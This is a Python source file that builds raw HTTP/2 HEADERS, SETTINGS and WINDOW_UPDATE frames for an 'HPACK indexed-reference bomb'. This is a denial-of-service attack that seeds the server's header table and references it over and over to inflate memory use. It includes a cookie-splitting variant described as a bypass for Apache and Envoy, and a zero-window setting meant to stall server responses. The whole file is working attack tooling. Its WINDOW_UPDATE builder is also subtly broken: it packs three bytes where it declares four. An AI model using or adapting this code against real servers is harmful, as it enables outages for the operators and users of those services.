"""HPACK indexed-reference bomb frame builder (RFC 7541)."""

from __future__ import annotations

import struct

from hpack import Encoder, HeaderTuple

# RFC 7541 static table size; first dynamic entry is index 62 (most recent).
STATIC_TABLE_SIZE = 61
FIRST_DYNAMIC_INDEX = STATIC_TABLE_SIZE + 1


def build_cookie_crumb_headers(
    crumb_count: int,
    crumb_value: bytes = b"x",
    name: bytes = b"cookie",
) -> list[HeaderTuple]:
    """Split Cookie into per-crumb fields (RFC 9113 section 8.2.3 bypass on Apache/Envoy)."""
    headers: list[HeaderTuple] = []
    for i in range(crumb_count):
        headers.append(HeaderTuple(name, f"c{i}={crumb_value.decode('ascii')}".encode()))
    return headers


def build_indexed_reference_bomb(
    seed_header: HeaderTuple,
    reference_count: int,
    use_cookie_crumbs: bool = False,
    crumb_count: int = 32,
) -> bytes:
    """
    Build an HPACK block that seeds the dynamic table then emits indexed references.

    Strategy A (generic): insert one header, reference it N times via indexed representation.
    Strategy B (Apache/Envoy): many cookie crumbs then indexed refs to each entry.
    """
    enc = Encoder()

    if use_cookie_crumbs:
        crumbs = build_cookie_crumb_headers(crumb_count)
        block = enc.encode(crumbs)
        newest = FIRST_DYNAMIC_INDEX + crumb_count - 1
        for _ in range(reference_count):
            block += _encode_indexed(newest)
        return block

    block = enc.encode([seed_header])
    for _ in range(reference_count):
        block += _encode_indexed(FIRST_DYNAMIC_INDEX)
    return block


def build_bomb_hpack_block(
    host: str,
    path: str,
    use_tls: bool,
    references: int,
    use_cookie_crumbs: bool = False,
    crumb_count: int = 32,
    seed_header: HeaderTuple | None = None,
) -> bytes:
    """Build a complete HPACK block (pseudo-headers + bomb) in one encoder session."""
    enc = Encoder()
    block = enc.encode([
        (b":method", b"GET"),
        (b":path", path.encode() if isinstance(path, str) else path),
        (b":scheme", b"https" if use_tls else b"http"),
        (b":authority", host.encode()),
    ])
    seed = seed_header or HeaderTuple(b"x-bomb-seed", b"a")
    if use_cookie_crumbs:
        crumbs = build_cookie_crumb_headers(crumb_count)
        block += enc.encode(crumbs)
        newest = FIRST_DYNAMIC_INDEX + len(crumbs) - 1
        for _ in range(references):
            block += _encode_indexed(newest)
    else:
        block += enc.encode([seed])
        for _ in range(references):
            block += _encode_indexed(FIRST_DYNAMIC_INDEX)
    return block


def _encode_indexed(index: int) -> bytes:
    """Encode HPACK indexed header field representation."""
    if index <= 0x7F:
        return bytes([0x80 | index])
    out = bytearray([0x80 | 0x7F])
    rem = index - 0x7F
    while rem >= 0x80:
        out.append(0x80 | (rem & 0x7F))
        rem >>= 7
    out.append(rem & 0x7F)
    return bytes(out)


def build_headers_frame(
    stream_id: int,
    hpack_block: bytes,
    end_stream: bool = False,
    end_headers: bool = True,
) -> bytes:
    """Build a raw HTTP/2 HEADERS frame (9-byte header + payload)."""
    flags = 0
    if end_stream:
        flags |= 0x01
    if end_headers:
        flags |= 0x04
    payload = hpack_block
    length = len(payload)
    frame = struct.pack(">I", length)[1:]
    frame += bytes([0x01, flags])
    frame += struct.pack(">I", stream_id & 0x7FFFFFFF)
    frame += payload
    return frame


def build_window_update(stream_id: int, increment: int) -> bytes:
    """Build WINDOW_UPDATE frame (increment must be > 0)."""
    increment = increment & 0x7FFFFFFF
    frame = struct.pack(">I", 4)[1:]
    frame += bytes([0x08, 0x00])
    frame += struct.pack(">I", stream_id & 0x7FFFFFFF)
    frame += struct.pack(">I", increment)[1:]
    return frame


def build_settings_ack(settings_payload: bytes = b"") -> bytes:
    """Build SETTINGS frame with ACK flag."""
    length = len(settings_payload)
    frame = struct.pack(">I", length)[1:]
    frame += bytes([0x04, 0x01])
    frame += struct.pack(">I", 0)
    frame += settings_payload
    return frame


def build_settings(initial_window_size: int = 0) -> bytes:
    """Build SETTINGS with INITIAL_WINDOW_SIZE (0 = stall server DATA)."""
    payload = struct.pack(">HI", 0x04, initial_window_size & 0xFFFFFFFF)
    frame = struct.pack(">I", len(payload))[1:]
    frame += bytes([0x04, 0x00])
    frame += struct.pack(">I", 0)
    frame += payload
    return frame
